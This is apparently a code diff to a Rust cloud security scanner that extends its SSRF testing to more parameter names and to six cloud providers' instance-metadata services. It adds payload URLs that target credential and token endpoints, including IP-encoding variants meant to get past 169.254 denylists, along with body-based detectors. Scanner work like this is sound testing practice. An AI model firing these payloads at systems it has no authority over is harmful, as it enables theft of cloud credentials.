@@ -42,7 +42,9 @@ impl CloudSecurityScanner {
         // Only test URL-like parameters
         let url_params = [
             "url", "uri", "path", "redirect", "target", "dest", "link", "site", "file", "page",
-            "src", "href", "callback", "return", "next",
+            "src", "href", "callback", "return", "next", "webhook", "fetch", "feed", "proxy",
+            "image", "img", "avatar", "thumbnail", "remote", "endpoint", "domain", "host",
+            "ref", "continue", "forward", "open",
         ];
         let param_lower = param_name.to_lowercase();
         if !url_params.iter().any(|p| param_lower.contains(p)) {
@@ -54,24 +56,14 @@ impl CloudSecurityScanner {
             param_name
         );
 
-        // Test AWS metadata
-        let (vulns, tests) = self
-            .test_metadata_ssrf_on_param(url, param_name, "aws")
-            .await?;
-        vulnerabilities.extend(vulns);
-        tests_run += tests;
-
-        if vulnerabilities.is_empty() {
+        // Probe each cloud's metadata service in order. Detection is body-content
+        // based so untouched targets cannot produce false positives.
+        for cloud in &["aws", "gcp", "azure", "alibaba", "digitalocean", "oracle"] {
+            if !vulnerabilities.is_empty() {
+                break;
+            }
             let (vulns, tests) = self
-                .test_metadata_ssrf_on_param(url, param_name, "gcp")
-                .await?;
-            vulnerabilities.extend(vulns);
-            tests_run += tests;
-        }
-
-        if vulnerabilities.is_empty() {
-            let (vulns, tests) = self
-                .test_metadata_ssrf_on_param(url, param_name, "azure")
+                .test_metadata_ssrf_on_param(url, param_name, cloud)
                 .await?;
             vulnerabilities.extend(vulns);
             tests_run += tests;
@@ -94,14 +86,47 @@ impl CloudSecurityScanner {
             "aws" => vec![
                 "http://169.254.169.254/latest/meta-data/",
                 "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                // IP-encoding bypass variants for naive 169.254.x.x denylists
+                "http://[::ffff:169.254.169.254]/latest/meta-data/",
+                "http://0251.0376.0251.0376/latest/meta-data/",
+                "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
+                "http://2852039166/latest/meta-data/",
+                "http://169.254.169.254.nip.io/latest/meta-data/",
+                // Alt host header & ECS task metadata
+                "http://169.254.170.2/v2/credentials/",
+                "http://169.254.170.2/v2/metadata",
             ],
             "gcp" => vec![
                 "http://metadata.google.internal/computeMetadata/v1/",
                 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+                "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true",
+                "http://metadata/computeMetadata/v1/",
+                "http://169.254.169.254/computeMetadata/v1/",
             ],
             "azure" => vec![
                 "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/",
+                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/",
+                "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
+            ],
+            "alibaba" => vec![
+                "http://100.100.100.200/latest/meta-data/",
+                "http://100.100.100.200/latest/meta-data/instance-id",
+                "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
+                "http://100.100.100.200/latest/user-data",
+            ],
+            "digitalocean" => vec![
+                "http://169.254.169.254/metadata/v1.json",
+                "http://169.254.169.254/metadata/v1/",
+                "http://169.254.169.254/metadata/v1/id",
+                "http://169.254.169.254/metadata/v1/user-data",
+            ],
+            "oracle" => vec![
+                "http://169.254.169.254/opc/v2/instance/",
+                "http://169.254.169.254/opc/v2/identity/",
+                "http://169.254.169.254/opc/v1/instance/",
             ],
             _ => vec![],
         };
@@ -120,6 +145,9 @@ impl CloudSecurityScanner {
                         "aws" => self.detect_aws_metadata(&response.body),
                         "gcp" => self.detect_gcp_metadata(&response.body),
                         "azure" => self.detect_azure_metadata(&response.body),
+                        "alibaba" => self.detect_alibaba_metadata(&response.body),
+                        "digitalocean" => self.detect_digitalocean_metadata(&response.body),
+                        "oracle" => self.detect_oracle_metadata(&response.body),
                         _ => false,
                     };
                     if detected {
@@ -483,6 +511,91 @@ impl CloudSecurityScanner {
             }
         }
 
+        false
+    }
+
+    /// Alibaba Cloud ECS metadata service (100.100.100.200).
+    /// Requires two independent indicators to confirm.
+    fn detect_alibaba_metadata(&self, body: &str) -> bool {
+        let indicators = [
+            "instance-id",
+            "ram/security-credentials",
+            "region-id",
+            "zone-id",
+            "owner-account-id",
+            "private-ipv4",
+            "vpc-id",
+            "vswitch-id",
+            "image-id",
+            "AccessKeyId",
+            "SecurityToken",
+        ];
+        let body_lower = body.to_lowercase();
+        let mut matches = 0;
+        for indicator in indicators {
+            if body_lower.contains(&indicator.to_lowercase()) {
+                matches += 1;
+                if matches >= 2 {
+                    return true;
+                }
+            }
+        }
+        false
+    }
+
+    /// DigitalOcean droplet metadata service (169.254.169.254/metadata/v1.json).
+    /// Requires two indicators to confirm — generic words like "id" alone never trigger.
+    fn detect_digitalocean_metadata(&self, body: &str) -> bool {
+        let indicators = [
+            "droplet_id",
+            "hostname",
+            "interfaces",
+            "floating_ip",
+            "dns",
+            "region",
+            "features",
+            "vendor_data",
+            "public_keys",
+            "auth_key",
+        ];
+        let body_lower = body.to_lowercase();
+        let mut matches = 0;
+        for indicator in indicators {
+            if body_lower.contains(&indicator.to_lowercase()) {
+                matches += 1;
+                if matches >= 2 {
+                    return true;
+                }
+            }
+        }
+        false
+    }
+
+    /// Oracle Cloud Infrastructure (OCI) instance metadata (/opc/v2/instance).
+    /// Requires two independent OCI-prefixed indicators to confirm.
+    fn detect_oracle_metadata(&self, body: &str) -> bool {
+        let indicators = [
+            "ocid1.instance.",
+            "ocid1.tenancy.",
+            "ocid1.compartment.",
+            "canonicalRegionName",
+            "availabilityDomain",
+            "shape",
+            "displayName",
+            "freeformTags",
+            "definedTags",
+            "instanceCertificate",
+        ];
+        let body_lower = body.to_lowercase();
+        let mut matches = 0;
+        for indicator in indicators {
+            if body_lower.contains(&indicator.to_lowercase()) {
+                matches += 1;
+                if matches >= 2 {
+                    return true;
+                }
+            }
+        }
         false
     }
 
